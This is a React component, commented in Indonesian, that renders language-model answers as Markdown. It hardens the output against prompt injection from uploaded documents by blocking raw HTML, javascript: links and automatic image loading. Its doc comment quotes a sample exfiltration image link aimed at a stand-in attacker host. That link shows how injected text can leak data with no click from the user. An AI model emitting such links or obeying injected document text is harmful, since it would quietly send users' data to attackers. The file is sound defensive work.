"use client";

import { ExternalLink, ImageOff } from "lucide-react";
import { memo, useMemo, type ReactNode } from "react";
import Markdown, { type Components } from "react-markdown";
import { citationIndexFromHref, linkifyCitations, parseCitations, type Citation } from "@/lib/citations";
import { cx } from "./ui";

type Props = {
  text: string;
  /** true = tampilkan kursor berkedip di akhir teks (jawaban masih di-stream). */
  streaming?: boolean;
  /** Render sitasi inline. Tidak diisi = marker sitasi dibiarkan sebagai teks. */
  renderCitation?: (citation: Citation) => ReactNode;
  className?: string;
};

/**
 * Render jawaban LLM sebagai Markdown — dengan aman.
 *
 * Jawaban model bisa "terkontaminasi" isi dokumen upload (prompt injection),
 * jadi diperlakukan sebagai input TIDAK tepercaya:
 * - HTML mentah TIDAK dirender: react-markdown tanpa rehype-raw menampilkan
 *   `<script>` dsb. sebagai teks biasa. Jangan pernah tambahkan rehype-raw.
 * - URL berbahaya (`javascript:` dll.) dibuang oleh urlTransform bawaan.
 * - Gambar TIDAK dimuat otomatis: `![](https://penyerang/?data=...)` adalah
 *   teknik klasik mencuri data lewat request gambar tanpa klik apa pun.
 * - Hanya link http(s)/mailto yang bisa diklik, dibuka di tab baru dengan
 *   rel="noopener noreferrer nofollow" (URL tampil di tooltip sebelum diklik).
 */
function AnswerMarkdownImpl({ text, streaming = false, renderCitation, className }: Props) {
  const citations = useMemo(() => (renderCitation ? parseCitations(text) : []), [text, renderCitation]);
  const markdown = useMemo(() => (renderCitation ? linkifyCitations(text) : text), [text, renderCitation]);

  const components = useMemo<Components>(
    () => ({
      a: ({ href, children }) => {
        const index = citationIndexFromHref(href);
        const citation = index === null ? undefined : citations[index];
        if (citation && renderCitation) return <>{renderCitation(citation)}</>;
        // Hanya link web absolut yang boleh diklik. URL yang dikosongkan
        // urlTransform (mis. `javascript:`) atau link relatif cukup jadi teks.
        if (!href || !/^(https?:|mailto:)/i.test(href)) return <span>{children}</span>;
        return (
          <a href={href} target="_blank" rel="noopener noreferrer nofollow" title={href}>
            {children}
            <ExternalLink aria-hidden="true" className="ml-0.5 inline size-3 -translate-y-px" />
          </a>
        );
      },
      img: ({ alt }) => (
        <span className="inline-flex items-center gap-1 rounded bg-zinc-100 px-1.5 py-0.5 text-xs text-zinc-500 dark:bg-zinc-800 dark:text-zinc-400">
          <ImageOff aria-hidden="true" className="size-3" />
          gambar tidak dimuat{alt ? `: ${alt}` : ""}
        </span>
      ),
    }),
    [citations, renderCitation],
  );

  return (
    <div className={cx("md-answer", streaming && "md-streaming", className)}>
      <Markdown components={components}>{markdown}</Markdown>
    </div>
  );
}

// memo: saat token baru masuk, hanya bagian teks yang berubah yang di-parse ulang.
export const AnswerMarkdown = memo(AnswerMarkdownImpl);
